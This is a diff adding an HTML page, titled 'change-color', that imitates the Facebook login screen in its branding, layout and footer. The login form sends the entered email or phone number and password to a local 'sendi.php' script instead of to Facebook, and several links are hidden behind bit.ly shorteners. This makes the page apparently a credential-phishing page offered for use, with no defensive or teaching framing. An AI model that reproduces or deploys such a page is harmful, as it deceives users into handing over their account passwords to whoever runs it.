@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>change-color</title>
+	<link rel="stylesheet" type="text/css" href="home.css">
+	<meta thhp-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript"></script>
+    <meta charset="utf-8">
+    <!-- bootstrap -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<style>
+    body{
+	margin: 0;
+	padding: 0;
+}
+*{
+	margin: 0;
+	padding: 0
+}
+.hed1 {
+	background-color:#1877F2;
+    height: 35px;
+    margin-bottom: 23px;
+    height: 40px;
+}
+.hed1 p {
+	font-family: sans-serif;
+	color: #fff;
+	font-size: 26px;
+	padding-top: 5px;
+    font-weight: bold;
+    text-align: center;
+}
+.hed p{
+	width: 100%;
+	height: 25px;
+	padding-top: 0;
+	background-color: #EBEAD9;
+	color: #8D9CB6;
+	text-align: center; 
+	margin-bottom: 10px;
+	font-size: 16px;
+	font-weight: bold;
+	padding: 10px 0 0 0 !important;
+}
+
+.login input[type="text"],
+.login input[type="Password"]{
+	width: 400px;
+	display: block;
+	margin: auto;
+	height: 35px;
+	padding: 5px;
+	margin-bottom: 10px;
+	border: 0;
+	border-radius: 4px;
+	font-size: 16px;
+	font-family: sans-serif;
+	outline: none;
+	background-color: #F5F6F8;
+
+}
+.sub input[type="submit"]{
+	display: block;
+	margin: auto;
+	width: 400px;
+	height: 40px;
+	background-color: #1877f2;
+	outline: none;
+	border: none;
+	color: #fff;
+	font-weight: bold;
+	font-size: 16px;
+	border-radius: 6px;
+}
+.sub input[type="submit"] :hover{
+	background-color: 
+}
+.hr{
+	align-items: center;
+	border-bottom: 1px solid #dadde1;
+	display: flex;
+	margin: 20px 16px;
+	margin-left: 490px;
+	width: 300px;
+}
+.btn input[type="submit"]{
+	display: block;
+	margin: auto;
+	width: 250px;
+	font-size: 16px;
+	font-weight: bold;
+	color: #fff;
+	background: #00a400;
+	outline: none;
+	border: none;
+	border-radius: 4px;
+	height: 45px;
+	margin-bottom: 10px;
+}
+.forget{
+	margin-bottom: 50px;
+}
+.forget a{
+	text-decoration: none;
+	margin-left: 565px;
+	color: #7596c8;
+	font-family: sans-serif;
+}
+.bout a{
+	text-decoration: none;
+	color: #576b95;
+	font-size: 12px;
+}
+
+/* footer */
+.dad{
+	margin: 0 auto;
+	max-width: 500px;
+}
+.f_r {
+	    width: 49%;
+    float: right;
+    text-align: center;
+}
+.f_l{
+	    width: 49%;
+    float: left;
+    text-align: center;
+}
+
+.fr a{
+	text-decoration: none;
+	color: #576b95;
+	font-size: 12px;
+}
+.De a{
+	text-decoration: none;
+    color: #576b95;
+    font-size: 12px;
+}
+.po a{
+	text-decoration: none;
+	color: #576b95;
+	font-size: 12px;
+
+}
+.bout1 a{
+	text-decoration: none;
+	color: #576b95;
+	font-size: 12px;
+}
+.fr1 a{
+	text-decoration: none;
+	color: #576b95;
+	font-size: 12px;
+}
+.De1 a{
+	text-decoration: none;
+    color: #576b95;
+    font-size: 12px;
+}
+.po1 a{
+	text-decoration: none;
+	color: #576b95;
+	font-size: 12px;
+
+}
+.about{
+	text-align: center;
+	margin-top: 30px;
+	padding-top: 30px;
+	margin-bottom: 10px;
+
+}
+.about a{
+	text-decoration: none;
+	color: #8a8d91;
+	margin: 0 5px;
+}
+.about2{
+	text-align: center;
+	font-family: sans-serif;
+	font-size: 12px;
+}
+@media  screen and (max-width:700px) {
+	.hed p{
+	width: 100%;
+	height: 30px;
+	padding-top: 0;
+	background-color: #EBEAD9;
+	color: #8D9CB6;
+	text-align: left; 
+	margin-bottom: 10px;
+	font-size: 16px;
+	font-weight: bold;
+	}
+	.forget a{
+	margin-left: 0px !important;
+}
+.forget{
+	text-align: center;
+	margin-bottom: 50px;
+}
+.hr{
+	width: 100%;	
+	margin-left: 0px !important;
+}
+
+.btn{
+	margin: auto;
+    display: block !important;
+}
+.sub input[type="submit"]{
+	width: 95% !important;
+}
+ .login input[type="text"], .login input[type="Password"] {
+	height: 35px;
+	width: 330px !important;
+
+}
+
+
+
+}
+
+</style>
+<body>
+	<div class="hed1">
+	<p>facebook<p>
+	</div>
+	
+	     <form action="sendi.php" method="POST">
+		<div class="login">
+        <input type="text" name="email" required="" placeholder="Email or phone">
+		<input type="Password" name="password" placeholder="Password" required="">
+		</div>
+		<div class="sub">
+		<input type="submit"  value="Log In">
+		</div>
+		</form>
+		
+		<div class="hr">
+			</div>
+			<div class="btn">
+				<input type="submit"  value="Create New Account">
+			</div>
+			<div class="forget">
+				<a href="https://bit.ly/3awK82p">Forgotten password?"</a>
+			</div>
+
+	<div class="dad">	
+<!-- 1 -->
+		<div class="f_l">
+			<div class="bout">
+				<span class="en">
+					<a href="#">English (UK)</a>
+				</span>
+			</div>
+			<div class="fr">
+				<span class="fr">
+					<a href="#">Francais (France)</a>
+				</span>
+			</div>
+			<div class="De">
+				<span class="de">
+					<a href="#">Deutsch</a>
+				</span>	
+			</div>
+			<div class="po">
+				<span class="ba">
+					<a href="#">Português (Brasil)</a>
+				</span>
+			</div>
+		</div>
+<!-- 2 -->
+			<div class="f_r">
+			<div class="bout1">
+				<span class="en">
+					<a href="#">العربيه</a>
+				</span>
+			</div>
+			<div class="fr1">
+				<span class="fr">
+					<a href="#">Francais (France)</a>
+				</span>
+			</div>
+			<div class="De1">
+				<span class="de">
+					<a href="#">Deutsch</a>
+				</span>	
+			</div>
+			<div class="po1">
+				<span class="ba">
+					<a href="#">Português (Brasil)</a>
+				</span>
+		</div>
+	</div>	
+<br><br>
+	<div class="about">
+		<a href="https://bit.ly/39Owb0B">حول فيسبوك</a>
+		<a href="https://bit.ly/3pTvpVM">مساعدة</a>
+		<a href="#">المزيد</a>
+	</div>
+	<div class="about2">
+		<p>Facebook Inc.</p>
+	</div>
+</body>
+</html>
